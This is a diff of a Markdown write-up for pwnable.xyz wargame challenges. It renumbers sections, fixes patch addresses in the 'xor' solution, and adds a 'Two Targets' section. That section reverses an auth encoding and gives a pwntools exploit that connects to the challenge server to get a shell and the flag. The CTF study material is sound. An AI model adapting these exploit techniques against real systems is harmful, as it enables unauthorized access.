@@ -2,7 +2,7 @@
 title: Pwnable.xyz Writeup [50 points]
 tags: assignment3 wargame ctf writeup pwnable pwnable.xyz
 ---
-## 1. Welcome
+## 0. Welcome
 ```bash
 gdb-peda$ disas main
 No symbol "main" in current context.
@@ -118,7 +118,7 @@ printf:
 ```
 
 
-## 2. Sub
+## 1. Sub
 ```c
 //hexray generated with ida pro
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
@@ -152,8 +152,7 @@ junheah@ubuntu:~$ nc svc.pwnable.xyz 30001
 FLAG{sub_neg_==_add}
 ```
 
-## 3. Add
-
+## 2. Add
 ```nasm
 ...
    0x000000000040088e <+89>:    lea    rcx,[rbp-0x68]   ;c
@@ -191,7 +190,7 @@ Result: 4196386Input: a
 FLAG{easy_00b_write}
 ```
 
-## 4. Misalignment
+## 3. Misalignment
 ```nasm
 0x0000000008000a17 <+56>:    lea    rax,[rbp-0xa0]
 0x0000000008000a1e <+63>:    add    rax,0xf
@@ -256,7 +255,7 @@ a
 FLAG{u_cheater_used_a_debugger}
 ```
 
-## 5. GrownUp
+## 4. GrownUp
 ```c
 // ida pro hexray
 int __cdecl main(int argc, const char **argv, const char **envp)
@@ -337,7 +336,7 @@ Welcome 0x6010e0 0x7f73401958c0 (nil) 0x7f73403bc500 0x8 0x10401a83d0 0x2449260 
 [*] Got EOF while reading in interactive
 ```
 
-## 6. Note
+## 5. Note
 ``main``:
 ```c
 // local variable allocation has failed, the output may be wrong!
@@ -454,7 +453,7 @@ FLAG{useless_if_u_cant_print_the_note}desc: FLAG{useless_if_u_cant_print_the_not
 $  
 ```
 
-## 7. xor
+## 6. xor
 ```nasm
 Dump of assembler code for function main:
    0x0000000008000a34 <+0>:     push   rbp
@@ -521,6 +520,7 @@ gdb-peda$ cat /proc/187/maps
 08000000-08001000 rwxp 00000000 00:00 976125                     ~/challenge
 08201000-08202000 r--p 00001000 00:00 976125                     ~/challenge
 08202000-08203000 rw-p 00002000 00:00 976125                     ~/challenge
+...
 ```
 We have write permission to code segment.
 
@@ -528,7 +528,7 @@ And since the address of ``main`` is smaller than ``<result>``, we could overwri
 
 the call instruction looks something like this when disassembled:
 ```
-E8 X1 X2 X3 X4  ;X4 X3 X2 X1 : offset = [target address] - [current eip(rip)] - 5
+E8 X1 X2 X3 X4  ; X4 X3 X2 X1 : offset = [target address] - [current eip(rip)] - 5
 ```
 I'm going to overwrite the call instruction at <main+225>, so eip would be 0x8000b15. With the target address of 0x8000a21, offset would be [0x8000a21 - 0x8000b15 - 5] = 0xffffff07.
 
@@ -536,12 +536,12 @@ Also, we have to consider the fact that our target address should be in the form
 
 We have to change this
 ```
-0x8000b10 E8 E6 FC FF FF
+0x8000b15 E8 E6 FC FF FF
 0x8000b10 <main+220>:   0xfce6e800000000b8
 ```
 to this
 ```
-0x8000b10 E8 07 FF FF FF
+0x8000b15 E8 07 FF FF FF
 0x8000b10 <main+220>:   0xff07e800000000b8
 ```
 
@@ -552,8 +552,162 @@ The Poopolator
 > 💩   -69832182503309127 1 -262878
 FLAG{how_did_text_happen_to_be_rwx}> 💩
 ```
-
 ```
 reference:
 https://umbum.tistory.com/102
+```
+
+## 7. Two Targets
+```nasm
+0x0000000000400b3b <+55>:    call   0x4009af <read_int32>
+0x0000000000400b40 <+60>:    mov    DWORD PTR [rbp-0x44],eax
+0x0000000000400b43 <+63>:    mov    eax,DWORD PTR [rbp-0x44]
+0x0000000000400b46 <+66>:    cmp    eax,0x2
+0x0000000000400b49 <+69>:    je     0x400b9b <main+151>
+0x0000000000400b4b <+71>:    cmp    eax,0x2
+0x0000000000400b4e <+74>:    jg     0x400b5a <main+86>
+0x0000000000400b50 <+76>:    cmp    eax,0x1
+0x0000000000400b53 <+79>:    je     0x400b6d <main+105>
+0x0000000000400b55 <+81>:    jmp    0x400c0c <main+264>
+0x0000000000400b5a <+86>:    cmp    eax,0x3
+0x0000000000400b5d <+89>:    je     0x400bca <main+198>
+0x0000000000400b5f <+91>:    cmp    eax,0x4
+0x0000000000400b62 <+94>:    je     0x400bf5 <main+241>
+0x0000000000400b68 <+100>:   jmp    0x400c0c <main+264>
+```
+The main function reads input from user and jumps to inputted menu.
+```
+<1> change name
+0x0000000000400b6d <+105>:   lea    rdi,[rip+0x11d5]        # 0x401d49 "name: "
+0x0000000000400b74 <+112>:   mov    eax,0x0
+0x0000000000400b79 <+117>:   call   0x4007b0 <printf@plt>
+0x0000000000400b7e <+122>:   lea    rax,[rbp-0x40]
+0x0000000000400b82 <+126>:   mov    rsi,rax
+0x0000000000400b85 <+129>:   lea    rdi,[rip+0x11c4]        # 0x401d50 "%32s"
+0x0000000000400b8c <+136>:   mov    eax,0x0
+0x0000000000400b91 <+141>:   call   0x400820 <__isoc99_scanf@plt>
+0x0000000000400b96 <+146>:   jmp    0x400c1b <main+279>
+
+<2> change nationality
+0x0000000000400b9b <+151>:   lea    rdi,[rip+0x11b3]        # 0x401d55 "nationality: "
+0x0000000000400ba2 <+158>:   mov    eax,0x0
+0x0000000000400ba7 <+163>:   call   0x4007b0 <printf@plt>
+0x0000000000400bac <+168>:   lea    rax,[rbp-0x40]
+0x0000000000400bb0 <+172>:   add    rax,0x20
+0x0000000000400bb4 <+176>:   mov    rsi,rax
+0x0000000000400bb7 <+179>:   lea    rdi,[rip+0x11a5]        # 0x401d63 "%24s"
+0x0000000000400bbe <+186>:   mov    eax,0x0
+0x0000000000400bc3 <+191>:   call   0x400820 <__isoc99_scanf@plt>
+0x0000000000400bc8 <+196>:   jmp    0x400c1b <main+279>
+
+<3> change age
+0x0000000000400bca <+198>:   lea    rdi,[rip+0x1197]        # 0x401d68 "age: "
+0x0000000000400bd1 <+205>:   mov    eax,0x0
+0x0000000000400bd6 <+210>:   call   0x4007b0 <printf@plt>
+0x0000000000400bdb <+215>:   mov    rax,QWORD PTR [rbp-0x10]
+0x0000000000400bdf <+219>:   mov    rsi,rax
+0x0000000000400be2 <+222>:   lea    rdi,[rip+0x1185]        # 0x401d6e "%d"
+0x0000000000400be9 <+229>:   mov    eax,0x0
+0x0000000000400bee <+234>:   call   0x400820 <__isoc99_scanf@plt>
+0x0000000000400bf3 <+239>:   jmp    0x400c1b <main+279>
+
+<4> get shell
+0x0000000000400bf5 <+241>:   lea    rax,[rbp-0x40]   ;name
+0x0000000000400bf9 <+245>:   mov    rdi,rax
+0x0000000000400bfc <+248>:   call   0x400a26 <auth>
+0x0000000000400c01 <+253>:   test   al,al
+0x0000000000400c03 <+255>:   je     0x400c1a <main+278>
+0x0000000000400c05 <+257>:   call   0x40099c <win>
+0x0000000000400c0a <+262>:   jmp    0x400c1a <main+278>
+```
+``auth`` function in ``get shell`` checks the previously inputted ``name`` value.
+```nasm
+0x0000000000400a6a <+68>:    mov    rdx,QWORD PTR [rbp-0x48] ;name
+0x0000000000400a6e <+72>:    mov    eax,DWORD PTR [rbp-0x38] ;i
+0x0000000000400a71 <+75>:    cdqe
+0x0000000000400a73 <+77>:    movzx  eax,BYTE PTR [rdx+rax*1] ;name[i]
+0x0000000000400a77 <+81>:    shr    al,0x4   ; name[i] >> 4
+0x0000000000400a7a <+84>:    mov    ecx,eax
+0x0000000000400a7c <+86>:    mov    rdx,QWORD PTR [rbp-0x48]
+0x0000000000400a80 <+90>:    mov    eax,DWORD PTR [rbp-0x38]
+0x0000000000400a83 <+93>:    cdqe
+0x0000000000400a85 <+95>:    movzx  eax,BYTE PTR [rdx+rax*1]
+0x0000000000400a89 <+99>:    movzx  eax,al
+0x0000000000400a8c <+102>:   shl    eax,0x4  ; name[i] << 4
+0x0000000000400a8f <+105>:   or     eax,ecx
+0x0000000000400a91 <+107>:   mov    BYTE PTR [rbp-0x39],al   ; name[i] << 4 | name[i] >> 4
+0x0000000000400a94 <+110>:   mov    eax,DWORD PTR [rbp-0x38]
+0x0000000000400a97 <+113>:   movsxd rdx,eax
+0x0000000000400a9a <+116>:   lea    rax,[rip+0x63]        # 0x400b04 <main>
+0x0000000000400aa1 <+123>:   add    rax,rdx
+0x0000000000400aa4 <+126>:   movzx  eax,BYTE PTR [rax]   ; main[i]
+0x0000000000400aa7 <+129>:   xor    al,BYTE PTR [rbp-0x39]   ;main[i] ^ (name[i] << 4 | name[i] >> 4)
+0x0000000000400aaa <+132>:   mov    edx,eax
+0x0000000000400aac <+134>:   mov    eax,DWORD PTR [rbp-0x38]
+0x0000000000400aaf <+137>:   cdqe
+0x0000000000400ab1 <+139>:   mov    BYTE PTR [rbp+rax*1-0x30],dl ;save result at [rbp-0x30]
+0x0000000000400ab5 <+143>:   add    DWORD PTR [rbp-0x38],0x1
+0x0000000000400ab9 <+147>:   mov    eax,DWORD PTR [rbp-0x38] ;i
+0x0000000000400abc <+150>:   cmp    eax,0x1f
+0x0000000000400abf <+153>:   jbe    0x400a6a <auth+68>
+```
+I implemented the encoding process in python:
+```python
+name = 'a'*32
+main = [0x55,0x48,0x89,0xe5,0x48,0x83,0xec,0x50,0x64,0x48,0x8b,0x04,0x25,0x28,0x00,0x00,0x00,0x48,0x89,0x45,0xf8,0x31,0xc0,0xe8,0x24,0xfe,0xff,0xff,0x48,0x8d,0x45,0xc0]
+target = [0x11,0xde,0xcf,0x10,0xdf,0x75,0xbb,0xa5,0x43,0x1e,0x9d,0xc2,0xe3,0xbf,0xf5,0xd6,0x96,0x7f,0xbe,0xb0,0xbf,0xb7,0x96,0x1d,0xa8,0xbb,0x0a,0xd9,0xbf,0xc9,0x0d,0xff]
+res = []
+
+#encode:
+for i in range(0, 32):
+    res.append((((ord(name[i]) >> 4) | (ord(name[i]) << 4)) & 0xff) ^ main[i])
+```
+``auth`` goes through this encoding process and compares it with 0x401d28
+```nasm
+0x0000000000400ac1 <+155>:   lea    rax,[rbp-0x30]
+0x0000000000400ac5 <+159>:   mov    edx,0x20
+0x0000000000400aca <+164>:   lea    rsi,[rip+0x1257]        # 0x401d28
+0x0000000000400ad1 <+171>:   mov    rdi,rax
+0x0000000000400ad4 <+174>:   call   0x400770 <strncmp@plt>
+```
+By reversing the encoding process, I was able to get the correct input.
+
+exploit code:
+```python
+from pwn import *
+
+#decode
+newname = ''
+for i in range(0, 32):
+    t = target[i]^main[i]
+    newname += chr((t << 4 | t >> 4) & 0xff)
+print newname
+
+r = remote('svc.pwnable.xyz', 30031)
+r.recvuntil('> ')
+r.sendline('1')
+r.recvuntil('name: ')
+r.sendline(newname)
+r.recvuntil('> ')
+r.sendline('4')
+r.interactive()
+```
+exploit:
+```bash
+junheah@ubuntu:~$ python exp.py
+Did_you_really_miss_the_T_b\x7fD\x84
+[+] Opening connection to svc.pwnable.xyz on port 30031: Done
+[*] Switching to interactive mode
+Invalid
+Menu:
+  1. Change name.
+  2. Change nationality.
+  3. Change age.
+  4. Get shell.
+> FLAG{now_try_the_2nd_solution}Menu:
+  1. Change name.
+  2. Change nationality.
+  3. Change age.
+  4. Get shell.
+> $  
 ```
